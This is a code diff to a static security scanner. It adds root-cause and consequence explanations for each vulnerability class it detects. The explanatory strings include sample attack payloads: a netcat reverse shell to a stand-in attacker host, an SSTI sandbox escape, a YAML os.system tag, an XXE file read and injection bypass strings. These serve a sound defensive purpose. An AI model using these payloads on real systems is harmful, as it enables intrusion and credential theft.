@@ -84,6 +84,8 @@ class VulnPattern:
     description: str
     recommendation: str
     attack: str
+    root_cause: str = ""        # WHY this vulnerability exists
+    consequences: str = ""      # Business/security impact if exploited
     # Optional: patterns that SUPPRESS this finding (false positive guards)
     suppress: list = None
     # Only report if one of these taint sources appears in context window (N lines)
@@ -771,6 +773,368 @@ VULNERABILITY_PATTERNS: list[VulnPattern] = [
 ]
 
 
+# ── Root Cause & Consequence enrichment ────────────────────────────────────
+# Applied post-hoc so VulnPattern definitions stay concise.
+
+_ENRICHMENT: dict[str, dict[str, str]] = {
+    "sql_injection_concat": {
+        "root_cause": (
+            "Input validation is absent or bypassed before data reaches the SQL layer. "
+            "The developer trusted that input would be safe (type coercion, ORM layer) "
+            "without enforcing parameterization at the query construction site."
+        ),
+        "consequences": (
+            "FULL DATABASE COMPROMISE: Attacker reads all tables including usernames, "
+            "hashed passwords, emails, PII, and payment data.\n"
+            "AUTHENTICATION BYPASS: ' OR '1'='1 logs in as any user without a password.\n"
+            "DATA DESTRUCTION: DROP TABLE or mass DELETE removes all records permanently.\n"
+            "LATERAL MOVEMENT: MSSQL xp_cmdshell / MySQL LOAD_FILE allow OS command execution.\n"
+            "REGULATORY: GDPR breach notification required if PII is extracted."
+        ),
+    },
+    "sql_injection_format": {
+        "root_cause": (
+            "Developer used Python f-strings or .format() to embed variables in SQL for "
+            "readability or quick prototyping, unaware that the resulting string is passed "
+            "verbatim to the database engine with no escaping."
+        ),
+        "consequences": (
+            "Identical to string concatenation SQLi: full database read/write/delete, "
+            "authentication bypass, and potential OS command execution via database functions."
+        ),
+    },
+    "command_injection": {
+        "root_cause": (
+            "The application needs to invoke OS utilities (ping, ffmpeg, imagemagick, git) "
+            "and passes user input into the shell string for convenience. "
+            "shell=True or os.system() treats the entire string as a shell command, "
+            "allowing injected metacharacters (;, |, &&, ``) to chain new commands."
+        ),
+        "consequences": (
+            "FULL SERVER COMPROMISE: Attacker executes any command as the web server user.\n"
+            "DATA EXFILTRATION: Read /etc/passwd, .env files, SSH keys, application source.\n"
+            "REVERSE SHELL: nc -e /bin/bash attacker.com 4444 gives persistent access.\n"
+            "RANSOMWARE/WIPER: rm -rf / or encryption of all application data.\n"
+            "LATERAL MOVEMENT: Use compromised server as pivot to attack internal network."
+        ),
+    },
+    "code_injection_eval": {
+        "root_cause": (
+            "eval()/exec() used to dynamically execute code from user input, "
+            "often for convenience (dynamic formulas, scripting features, config evaluation). "
+            "The developer did not anticipate that arbitrary Python/JS syntax could be injected."
+        ),
+        "consequences": (
+            "REMOTE CODE EXECUTION: Attacker runs any code with the web process privileges.\n"
+            "All consequences of command injection plus direct access to application internals, "
+            "in-memory secrets, database connections, and encryption keys."
+        ),
+    },
+    "ssti": {
+        "root_cause": (
+            "Template engine called with raw user input instead of a static template file. "
+            "Often occurs when developers want to personalize templates dynamically "
+            "(e.g., email templates, dynamic pages) without understanding "
+            "that Jinja2/Twig/Smarty execute code inside {{ }} and {% %} delimiters."
+        ),
+        "consequences": (
+            "REMOTE CODE EXECUTION via template sandbox escape:\n"
+            "  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
+            "Full server compromise, environment variable theft (DB passwords, API keys), "
+            "and data exfiltration — indistinguishable from direct eval() injection."
+        ),
+    },
+    "ldap_injection": {
+        "root_cause": (
+            "LDAP query constructed by concatenating user input without escaping "
+            "LDAP special characters (*, (, ), \\, NUL). "
+            "Developers often aren't aware of LDAP injection as a vulnerability class "
+            "despite LDAP being common in enterprise authentication."
+        ),
+        "consequences": (
+            "AUTHENTICATION BYPASS: Payload *)(uid=*))(|(uid=* logs in as any user.\n"
+            "USER ENUMERATION: Dump all LDAP directory entries including emails and groups.\n"
+            "PRIVILEGE ESCALATION: Access admin groups or modify LDAP attributes.\n"
+            "SCOPE: Every user managed by the LDAP directory is at risk."
+        ),
+    },
+    "nosql_injection": {
+        "root_cause": (
+            "MongoDB/NoSQL query built directly from request JSON without sanitization. "
+            "Since JSON values can be objects ({$gt: ''}) rather than strings, "
+            "operator injection bypasses intended query logic without any string escaping."
+        ),
+        "consequences": (
+            "AUTHENTICATION BYPASS: {username: {$gt: ''}} matches any username.\n"
+            "DATA EXTRACTION: $where and $regex operators enable large-scale data dumps.\n"
+            "SCOPE: Unlike SQL injection, NoSQL injection can be hard to detect in logs "
+            "because the query syntax looks like normal JSON data."
+        ),
+    },
+    "xxe": {
+        "root_cause": (
+            "XML parser configured with default settings that allow external entity resolution. "
+            "Most XML libraries enable this by default for spec-compliance reasons. "
+            "Developers rarely disable it because XML injection isn't as well-known as SQLi."
+        ),
+        "consequences": (
+            "LOCAL FILE READ: <!ENTITY xxe SYSTEM 'file:///etc/passwd'> reads any file.\n"
+            "SSRF: Requests to internal services (AWS metadata, Redis, internal APIs).\n"
+            "DENIAL OF SERVICE: Billion laughs attack causes memory exhaustion.\n"
+            "DATA EXFILTRATION: Blind XXE via DNS/HTTP out-of-band channels."
+        ),
+    },
+    "xss_innerhtml": {
+        "root_cause": (
+            "Developer used innerHTML for convenience to render dynamic HTML content "
+            "without sanitization. innerHTML is a sink that executes any JavaScript "
+            "in <script> tags or event handlers (onerror, onclick) within the assigned string."
+        ),
+        "consequences": (
+            "SESSION HIJACKING: Steal cookies → impersonate any user including admins.\n"
+            "KEYLOGGING: Capture all keystrokes (passwords, credit card numbers).\n"
+            "PHISHING: Replace login form with attacker-controlled version.\n"
+            "MALWARE DISTRIBUTION: Redirect victims to malware download pages.\n"
+            "CRYPTO MINING: Hijack browser CPU for cryptocurrency mining.\n"
+            "WORM: XSS can self-replicate by posting to other users automatically."
+        ),
+    },
+    "xss_document_write": {
+        "root_cause": "Same as innerHTML XSS — document.write() is a legacy DOM API that renders HTML strings directly into the page without sanitization.",
+        "consequences": "Session hijacking, keylogging, phishing, defacement. DOM-based XSS is harder to detect because it never hits the server.",
+    },
+    "xss_react_dangerous": {
+        "root_cause": (
+            "dangerouslySetInnerHTML bypasses React's XSS protection intentionally. "
+            "Developers use it to render rich HTML content (markdown, CMS content) "
+            "without running it through a sanitizer like DOMPurify."
+        ),
+        "consequences": (
+            "Same as innerHTML XSS. Particularly dangerous in React apps because "
+            "developers trust React's default XSS protection and assume they're safe, "
+            "creating a false sense of security."
+        ),
+    },
+    "xss_server_reflected": {
+        "root_cause": (
+            "Server renders user input directly into HTML response without escaping. "
+            "Commonly occurs in error pages (showing the invalid input back to the user), "
+            "search results, or template variables rendered without the |e or |escape filter."
+        ),
+        "consequences": (
+            "REFLECTED XSS: Attacker sends victim a crafted URL that injects script.\n"
+            "Enables the same impacts as DOM XSS but also visible in server access logs.\n"
+            "STORED XSS (if persisted): Affects every user who views the content."
+        ),
+    },
+    "path_traversal": {
+        "root_cause": (
+            "File serving code uses user-controlled input as a path without verifying "
+            "the resolved path stays within the intended base directory. "
+            "../ sequences are URL-decoded and resolve to parent directories, "
+            "allowing escape from the intended directory tree."
+        ),
+        "consequences": (
+            "ARBITRARY FILE READ: /etc/passwd, /etc/shadow, .env, private keys, "
+            "application source code, database credentials.\n"
+            "SECRET THEFT: Reading .env files yields DB passwords, API keys, JWT secrets.\n"
+            "SOURCE CODE DISCLOSURE: Enables finding additional vulnerabilities.\n"
+            "ACCOUNT TAKEOVER: /home/user/.ssh/id_rsa gives SSH access."
+        ),
+    },
+    "ssrf": {
+        "root_cause": (
+            "Application makes HTTP requests to URLs derived from user input "
+            "without validating the target. Intended for fetching remote resources "
+            "(webhooks, previews, integrations) but not restricted to external domains."
+        ),
+        "consequences": (
+            "CLOUD METADATA THEFT: http://169.254.169.254/latest/meta-data/ yields "
+            "AWS IAM credentials → full cloud account access.\n"
+            "INTERNAL SERVICE ACCESS: Reach Redis, Elasticsearch, internal APIs, "
+            "admin dashboards not exposed to the internet.\n"
+            "PORT SCAN: Map internal network topology.\n"
+            "RCE via Redis SSRF: Write cron jobs or SSH keys via Redis RESP protocol."
+        ),
+    },
+    "weak_hash": {
+        "root_cause": (
+            "MD5/SHA1 chosen because they're fast, well-known, and available everywhere. "
+            "Developers confuse general-purpose hashing (checksums) with cryptographic "
+            "password hashing, which requires intentional slowness (cost factor) to resist brute force."
+        ),
+        "consequences": (
+            "PASSWORD CRACKING: MD5 hashes cracked at 10 billion/sec on a GPU.\n"
+            "RAINBOW TABLES: Most common passwords cracked instantly via online lookup.\n"
+            "REAL WORLD: LinkedIn 2012 breach — 117M SHA1 hashes cracked in days.\n"
+            "COMPLIANCE FAILURE: PCI-DSS Req 8.2.1, NIST SP 800-131A prohibit MD5/SHA1 "
+            "for cryptographic purposes. Audit failure, potential fines."
+        ),
+    },
+    "weak_cipher": {
+        "root_cause": (
+            "Legacy cipher selected from old documentation, tutorials, or copied from "
+            "pre-2005 code. DES was broken in 1998 (56-bit key space), RC4 has "
+            "statistical biases exploited in TLS BEAST/RC4 attacks."
+        ),
+        "consequences": (
+            "DECRYPTION: DES can be brute-forced in under 24 hours with commodity hardware.\n"
+            "DATA EXPOSURE: All data encrypted with weak cipher must be considered compromised.\n"
+            "COMPLIANCE: NIST deprecated DES in 2005, RC4 in 2015. PCI-DSS non-compliance.\n"
+            "RETROACTIVE ATTACK: Captured ciphertext can be decrypted after key recovery."
+        ),
+    },
+    "insecure_random": {
+        "root_cause": (
+            "random.random() / Math.random() use a non-cryptographic PRNG (Mersenne Twister) "
+            "seeded with a predictable value. The PRNG state can be reconstructed after "
+            "observing 624 consecutive outputs, allowing prediction of all future values."
+        ),
+        "consequences": (
+            "TOKEN PREDICTION: Password reset tokens, session IDs, or CSRF tokens generated "
+            "with random.random() are predictable → account takeover.\n"
+            "GAMBLING EXPLOIT: Predict shuffle order or random outcomes in games.\n"
+            "OTP BYPASS: Predictable OTP values can be calculated without the secret."
+        ),
+    },
+    "hardcoded_password": {
+        "root_cause": (
+            "Password or secret stored in source code for convenience or because the developer "
+            "didn't have a secrets management solution. Once in version control, "
+            "the credential exists in git history permanently even after 'deletion'."
+        ),
+        "consequences": (
+            "PERMANENT EXPOSURE: Credential exists in git history forever, accessible via "
+            "git log even after removal from current code.\n"
+            "PUBLIC LEAKAGE: If repository is ever made public, credential is immediately exposed.\n"
+            "AUTOMATED SCANNING: Bots scan GitHub/GitLab continuously for leaked credentials.\n"
+            "SCOPE: All systems using this credential must be considered compromised."
+        ),
+    },
+    "jwt_insecure": {
+        "root_cause": (
+            "JWT library configured to accept the 'none' algorithm (no signature) or "
+            "to use a weak/hardcoded HMAC secret. "
+            "Early JWT libraries defaulted to accepting algorithm: none for flexibility."
+        ),
+        "consequences": (
+            "TOKEN FORGERY: Attacker creates valid JWT as any user (admin, any user ID).\n"
+            "AUTHENTICATION BYPASS: No password needed — just craft a valid-looking token.\n"
+            "PRIVILEGE ESCALATION: Change 'role': 'user' to 'role': 'admin' in token payload.\n"
+            "SCOPE: Every authenticated endpoint in the application is compromised."
+        ),
+    },
+    "pickle_deserialization": {
+        "root_cause": (
+            "Python pickle used for serializing/deserializing data because it's convenient "
+            "and built-in. Developers don't realize pickle's __reduce__ protocol executes "
+            "arbitrary Python code during deserialization by design."
+        ),
+        "consequences": (
+            "REMOTE CODE EXECUTION: Any pickle.loads() on attacker data runs arbitrary Python.\n"
+            "One crafted payload gives the same access as the entire application process.\n"
+            "PERSISTENCE: Attacker can install backdoors, modify source, create admin accounts.\n"
+            "No exploit chain needed — deserialization IS code execution."
+        ),
+    },
+    "yaml_load": {
+        "root_cause": (
+            "yaml.load() without SafeLoader allows YAML's Python-specific tags "
+            "!!python/object/apply: to instantiate arbitrary Python objects and call functions. "
+            "This was the default behavior in PyYAML before version 6.0."
+        ),
+        "consequences": (
+            "REMOTE CODE EXECUTION: !!python/object/apply:os.system ['id'] executes shell commands.\n"
+            "Same impact as pickle deserialization — full server compromise from YAML input."
+        ),
+    },
+    "open_redirect": {
+        "root_cause": (
+            "Redirect target URL taken from query parameter without validation "
+            "to allow flexible post-login flows. "
+            "Developers don't restrict the redirect to the same origin/domain."
+        ),
+        "consequences": (
+            "PHISHING: Legitimate domain URL redirects to attacker's phishing page.\n"
+            "OAUTH TOKEN THEFT: redirect_uri manipulation steals authorization codes.\n"
+            "TRUST EXPLOITATION: Victims trust the initial legitimate domain in the URL.\n"
+            "REAL WORLD: Used in targeted spear-phishing campaigns against company employees."
+        ),
+    },
+    "prototype_pollution": {
+        "root_cause": (
+            "Deep merge/clone operations on user-supplied objects allow setting properties "
+            "on Object.prototype via __proto__, constructor, or prototype keys. "
+            "All JavaScript objects inherit from Object.prototype, so polluting it "
+            "affects every object in the application."
+        ),
+        "consequences": (
+            "APPLICATION-WIDE STATE CORRUPTION: Injecting isAdmin: true into Object.prototype "
+            "may affect all authorization checks using obj.isAdmin.\n"
+            "RCE: In Node.js, prototype pollution can chain into Remote Code Execution "
+            "via template engines (Handlebars, Pug) or child_process.\n"
+            "DoS: Corrupting toString or valueOf breaks all string operations."
+        ),
+    },
+    "debug_mode": {
+        "root_cause": (
+            "Debug mode left enabled for development convenience and not disabled "
+            "via environment-based configuration before production deployment."
+        ),
+        "consequences": (
+            "RCE VIA DEBUGGER: Werkzeug's interactive debugger allows Python execution in browser.\n"
+            "INFO DISCLOSURE: Full stack traces reveal file paths, versions, and config.\n"
+            "The Werkzeug debugger PIN protection has been broken multiple times (CVE-2024-34069)."
+        ),
+    },
+    "ssl_verification_disabled": {
+        "root_cause": (
+            "SSL verification disabled to work around certificate errors in development/testing, "
+            "or to connect to internal services with self-signed certificates. "
+            "The verify=False was never re-enabled before production."
+        ),
+        "consequences": (
+            "MAN-IN-THE-MIDDLE: Attacker intercepts ALL HTTPS traffic between server and third parties.\n"
+            "CREDENTIAL THEFT: API keys, OAuth tokens, and user data sent to third parties are stolen.\n"
+            "DATA TAMPERING: Responses can be modified in transit (inject malicious data, remove security checks).\n"
+            "SCOPE: Every outbound HTTPS call is vulnerable — payment APIs, auth providers, etc."
+        ),
+    },
+    "cors_wildcard": {
+        "root_cause": (
+            "CORS set to * for convenience during development so any frontend can call the API. "
+            "The wildcard was never replaced with an explicit allowlist. "
+            "Combined with Allow-Credentials: true, this is a fundamental protocol violation."
+        ),
+        "consequences": (
+            "CROSS-ORIGIN DATA THEFT: Any website can read authenticated API responses.\n"
+            "CSRF EQUIVALENT: Actions performed on behalf of logged-in users by attacker's page.\n"
+            "NOTE: Browsers block * + credentials combination, but many servers still send both headers "
+            "creating confusion and partial vulnerabilities."
+        ),
+    },
+    "sensitive_logging": {
+        "root_cause": (
+            "Sensitive data (passwords, tokens, PII) logged for debugging purposes "
+            "and never scrubbed before production. Log statements added during troubleshooting "
+            "often include sensitive context variables that developers forget to remove."
+        ),
+        "consequences": (
+            "LOG INJECTION: Attacker who reads logs gains credentials and tokens.\n"
+            "COMPLIANCE: GDPR Art. 5(1)(f), PCI-DSS Req. 3.3 prohibit logging card data/passwords.\n"
+            "THIRD-PARTY EXPOSURE: Logs shipped to Datadog/Splunk/ELK expose secrets to those vendors.\n"
+            "AUDIT TRAIL POLLUTION: Sensitive data in logs complicates breach investigation."
+        ),
+    },
+}
+
+# Apply enrichment to all patterns
+for _vp in VULNERABILITY_PATTERNS:
+    if _vp.id in _ENRICHMENT:
+        _vp.root_cause = _ENRICHMENT[_vp.id].get("root_cause", "")
+        _vp.consequences = _ENRICHMENT[_vp.id].get("consequences", "")
+
+
 # ── Scanner Class ──────────────────────────────────────────────────────────
 
 class StaticAnalyzer(BaseScanner):
@@ -890,6 +1254,8 @@ class StaticAnalyzer(BaseScanner):
                     recommendation=vp.recommendation,
                     cwe_id=vp.cwe,
                     attack_simulation=vp.attack,
+                    root_cause=vp.root_cause or None,
+                    consequences=vp.consequences or None,
                 ))
 
         return findings
